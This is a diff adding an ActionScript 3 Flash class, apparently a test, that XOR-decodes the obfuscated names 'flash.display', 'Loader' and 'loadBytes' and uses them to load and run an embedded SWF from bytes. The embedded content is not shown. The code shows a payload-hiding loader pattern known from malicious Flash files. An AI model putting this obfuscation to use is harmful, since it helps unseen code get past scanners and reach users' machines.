@@ -1,0 +1,46 @@
+package testflash
+{ 
+	import flash.display.*;
+	import flash.text.*;
+	import flash.utils.*;
+	import flash.net.*;
+	import flash.events.*;
+    import flash.system.*;
+ 
+
+    public class testflash extends Sprite
+    {
+        [Embed(source="simple.swf", mimeType="application/octet-stream")]
+        private static const DSs7dks:Class;
+        
+        
+        private function fdsgsdgds(encrypted:String):String
+        {
+            var decrypted:String = "";
+            for (var i:int = 0; i < encrypted.length; i++)
+            {
+                decrypted += String.fromCharCode(encrypted.charCodeAt(i)^0x0a);
+            }
+            return decrypted;
+        }
+        
+
+        public function testflash()
+        {
+            
+            // Load embedded content
+            var ns:Namespace = new Namespace(fdsgsdgds("lfkyb$ncyzfks"));
+            var n:String = fdsgsdgds("Feknox");
+            var x:Object = new ns::[n]();
+            var f:String = fdsgsdgds("feknHs~oy");
+            
+            var swfObj:Object = new DSs7dks();
+            var u:ByteArray = swfObj as ByteArray;
+            
+            x[f](u);
+            
+            addChild(x as DisplayObject);    
+            
+        }
+    } 
+}
